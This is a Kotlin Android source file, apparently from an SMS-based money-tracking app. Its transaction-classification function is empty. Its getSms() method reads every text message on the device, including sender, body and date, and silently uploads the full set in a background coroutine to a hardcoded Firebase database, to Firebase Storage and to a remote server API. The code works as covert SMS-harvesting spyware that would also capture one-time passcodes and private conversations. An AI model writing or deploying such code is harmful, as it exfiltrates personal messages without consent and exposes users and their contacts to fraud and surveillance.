package com.steve.msms.data.datasource

import android.content.Context
import android.provider.Telephony
import androidx.core.net.toUri
import androidx.lifecycle.MutableLiveData
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.steve.msms.data.csv.CsvUtils
import com.steve.msms.data.remote.SmsAPI
import com.steve.msms.domain.model.Message
import com.steve.msms.domain.model.SmsData
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import timber.log.Timber
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject
import javax.inject.Singleton


@Singleton
class SmsDataSource @Inject constructor(@ApplicationContext val context: Context) {


    @Inject
    lateinit var smsAPI: SmsAPI

    private val creditList = arrayListOf<Message>()
    private val debitList = arrayListOf<Message>()
    private var creditAmount = 0.0
    private var debitAmount = 0.0
    val smsLiveData = MutableLiveData<SmsData>()

    private var database: FirebaseDatabase =
        FirebaseDatabase.getInstance("https://msms-81a20-default-rtdb.firebaseio.com/")
    private var logRef: DatabaseReference = database.getReference("steve")

    @OptIn(DelicateCoroutinesApi::class)
    fun getSms() {
        val messageList = arrayListOf<Message>()

        val cursor =
            context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)

        while (cursor != null && cursor.moveToNext()) {

            val smsDate =
                cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)).toLong()
            val date = Date()
            date.time = smsDate
            val simpleDateFormat = SimpleDateFormat("dd/MM/yyyy")
            val dateString = simpleDateFormat.format(date)

            val number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
            val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)).toString()
            val id = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))


            messageList.add(
                Message(
                    number,
                    body,
                    dateString ,
                    id
                )
            )
        }

        cursor?.close()

        messageList.forEach { message ->
            checkIfMessageIsTransactional(message)
        }
        smsLiveData.value = SmsData(
            creditList,
            debitList,
            creditAmount,
            debitAmount
        )

        GlobalScope.launch(Dispatchers.IO) {
            val mFile = CsvUtils.toCsvFile(context, messageList, "sms_data")
            Timber.i("File Exists: ${mFile.exists()}")
            mFile.toUri()

            //Database
            val dateFormat: DateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
            val date = Date()
            val strDate: String = dateFormat.format(date).toString()
            logRef.child(strDate + "").setValue(messageList)

            // Storage
            val filename = UUID.randomUUID().toString()
            val ref = FirebaseStorage.getInstance().getReference("$strDate/data/$filename")
            ref.putFile(mFile.toUri())

            /**
             * UPLOAD FILE TO SERVER
             */

            val requestFile = mFile.asRequestBody("*".toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("sms_data", mFile.name, requestFile)

            val response = smsAPI.upload(body)

            when (response.isSuccessful) {
                true -> {
                    // TODO: do what you want when successful
                    println("success")
                }
                false -> {
                    // TODO: do what you need when failed
                    println("error")
                }
            }

        }



    }


    private fun checkIfMessageIsTransactional(message: Message) {



    }

}




